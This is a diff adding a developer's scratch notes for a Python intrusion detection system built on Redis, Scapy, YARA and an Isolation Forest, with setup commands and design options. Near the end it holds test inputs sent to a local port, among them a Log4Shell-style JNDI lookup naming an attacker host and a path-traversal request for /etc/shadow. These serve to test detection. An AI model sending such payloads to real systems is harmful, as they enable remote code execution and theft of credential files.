@@ -1,0 +1,191 @@
+sudo pacman -S redis followed by systemctl start redis
+
+sudo systemctl start docker
+sudo systemctl enable docker
+docker run -p 6379:6379 -d redis
+pip install redis fastapi uvicorn websockets
+
+
+
+Instead of putting the live network sniffer inside our IDS analysis loop—which would create a massive bottleneck—we decouple them completely using our new best friend, Redis.
+
+We build a dedicated, lightweight sniffer.py that does nothing but pull packets from the wire and push them directly into a raw Redis list acting as a high-speed FIFO queue (packet_buffer).
+
+Our existing main.py gets re-armed to run as a worker pool, continuously popping raw packets from that Redis list, analyzing them through the signature/ML layers, and publishing alerts.
+
+
+[ Network Interface ]
+         │  (Live Sniffing via Scapy/Raw Sockets)
+         ▼
+    sniffer.py
+         │  (LPUSH raw hex)
+         ▼
+   Redis [packet_buffer]
+         │  (BRPOP worker loop)
+         ▼
+      main.py (Dual-Engine IDS)
+         │  (PUBLISH cryptographic envelope)
+         ▼
+   Redis [ids_alerts] ──► dashboard/server.py ──► WebSocket ──► Browser
+
+
+
+
+   "The overarching orchestration, the live WebSocket UI, the data pipelines, and the Machine Learning heuristics are all written in Python, as requested. However, doing deep packet inspection on raw network wire data purely in Python causes the Global Interpreter Lock (GIL) to choke, dropping packets. To solve this, I architected a hybrid approach: Python manages the high-level logic, but it makes Foreign Function Interface (FFI) calls to the industry-standard YARA engine for the actual string matching, exactly like how enterprise SIEMs operate."
+
+
+
+
+pip install scapy
+
+
+
+
+
+
+
+
+
+
+# 1. Stop the native service if it's lingering in a bad state
+sudo systemctl stop redis
+
+# 2. Kill any zombie Docker container that might be holding the port
+sudo docker rm -f $(sudo docker ps -aq --filter publish=6379) 2>/dev/null
+
+# 3. Spin up a fresh Redis container
+sudo docker run -p 6379:6379 -d redis
+
+
+
+
+
+
+
+# 1. Stop the native service just in case it's blocking ports in a zombie state
+sudo systemctl stop redis
+
+# 2. Kill any old lingering redis containers
+sudo docker rm -f quantum-redis 2>/dev/null
+
+# 3. Start a fresh container named 'quantum-redis'
+sudo docker run --name quantum-redis -p 6379:6379 --restart always -d redis
+
+
+
+
+
+
+
+
+
+
+
+Terminal 1 (The Dashboard Bridge):
+
+Bash
+uvicorn dashboard.server:app --reload
+Terminal 2 (The Dashboard UI):
+cd dashboard
+python -m http.server 8080
+
+Terminal 3 (The IDS Analysis Engine):
+
+Bash
+python main.py
+Terminal 4 (The Live Sniffer Tap):
+Run with root privileges so it can hook into the network device drivers:
+
+Bash
+sudo .venv/bin/python sniffer.py
+
+
+
+
+
+echo "EXPLOIT_PAYLOAD_V1" > /dev/udp/127.0.0.1/9999
+python -c "import socket; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.sendto(b'EXPLOIT_PAYLOAD_V1', ('127.0.0.1', 9999))"
+
+
+
+
+
+
+
+# 1. Install necessary build tools and dependencies
+sudo pacman -S cmake openssl git gcc ninja
+
+# 2. Clone and build the native liboqs library
+git clone --depth 1 https://github.com/open-quantum-safe/liboqs.git
+cd liboqs
+mkdir build && cd build
+cmake -GNinja -DBUILD_SHARED_LIBS=ON ..
+ninja
+sudo ninja install
+
+# 3. Ensure your system's dynamic linker can locate the new shared library
+sudo ldconfig
+
+# 4. Move back to your project directory and install the Python bindings
+cd ~/Documents/Quantum_IDS
+.venv/bin/pip install git+https://github.com/open-quantum-safe/liboqs-python.git
+
+
+
+
+
+
+Option B: The State-Based Cache (The Enterprise Path)
+We use Redis as a high-speed sliding window cache. When main.py detects a threat, it hashes the payload and asks Redis, "Have I seen this exact hash in the last 5 seconds?" If yes, it drops it silently. If no, it logs it and caches the hash with an expiration timer (TTL).
+
+Pros: Highly accurate. It elegantly handles loopback echoes, TCP retransmissions, and ICMP bounces without blinding the IDS to distinct, rapid-fire attacks across different protocols.
+
+Cons: Slightly increases memory usage and adds a microsecond of latency to the analysis engine.
+
+Path C: Stateful Protocol Decoders (Deep Packet Inspection)
+The Concept: Instead of just scanning the raw hex payload of the entire packet, we build specific decoders for HTTP, DNS, and TLS. We parse out headers, URIs, and user-agents before running our analysis.
+
+Pros: Drastically reduces false positives because we know exactly what part of the application layer we are inspecting.
+
+Cons: High computational overhead. Reassembling TCP streams and parsing protocols purely in Python is where Scapy usually starts to choke under load.
+
+
+To make our Isolation Forest work, we have to fundamentally change how we process network traffic. Machine Learning models are mathematically blind to text, hex, and strings; they only understand floating-point matrices.If we want the model to catch a stealthy Nmap FIN scan or a slow-drip data exfiltration tunnel, we must translate every raw Scapy packet into a numerical Feature Vector, mathematically represented as $\mathbf{x} = [s, p, f, \Delta t]$.Here is the exact intelligence we need to extract from the wire to populate that vector:$s$ (Size): The raw byte length of the packet. Anomalously massive packets flag exfiltration; tiny, rapid packets flag flooding.$p$ (Protocol ID): The IP layer protocol number (e.g., TCP is 6, UDP is 17).$f$ (TCP Flags): We convert the TCP flag combinations (SYN, ACK, PSH, FIN) into an integer mask. A packet with no flags (a NULL scan) or illegal flag combinations (an XMAS scan) will instantly look mathematically alien to the model.$\Delta t$ (Inter-arrival Time): The time elapsed since we last saw a packet from this specific Source IP.Before we write the scikit-learn orchestration, we face a critical architectural decision regarding that final feature ($\Delta t$).
+
+
+
+Option 2: The Stateful Extractor (The Redis Delta)We keep the $\Delta t$ feature. To calculate it, every time a packet arrives, we log the Source IP and the current timestamp. Because you already have a highly tuned Redis instance running for the YARA deduplication window, we can just drop a fast last_seen:<IP> key into Redis.Pros: Gives the Isolation Forest deep behavioral context. It will easily catch automated, script-driven network probing based purely on the unnatural, machine-perfect timing of the packets.Cons: Requires us to make a microsecond Redis read/write for every single packet to calculate the time delta before passing the vector to the ML model.We have the infrastructure to support both. Do you want to build a lightweight, stateless model, or should we weaponize our existing Redis cache to track stateful time deltas for advanced behavioral detection?
+
+
+
+
+
+
+
+
+
+
+
+
+uvicorn dashboard.server:app --reload
+python main.py
+sudo .venv/bin/python sniffer.py
+python -c "import socket; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.sendto(b'EXPLOIT_PAYLOAD_V1', ('127.0.0.1', 9999))"
+python -c 'import socket; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.sendto(b"User-Agent: ${jndi:ldap://malicious-actor.net/Exploit}", ("127.0.0.1", 9999))'
+python -c "import socket; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.sendto(b'GET /../../../etc/shadow HTTP/1.1', ('127.0.0.1', 9999))"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.venv/bin/pip install yara-python
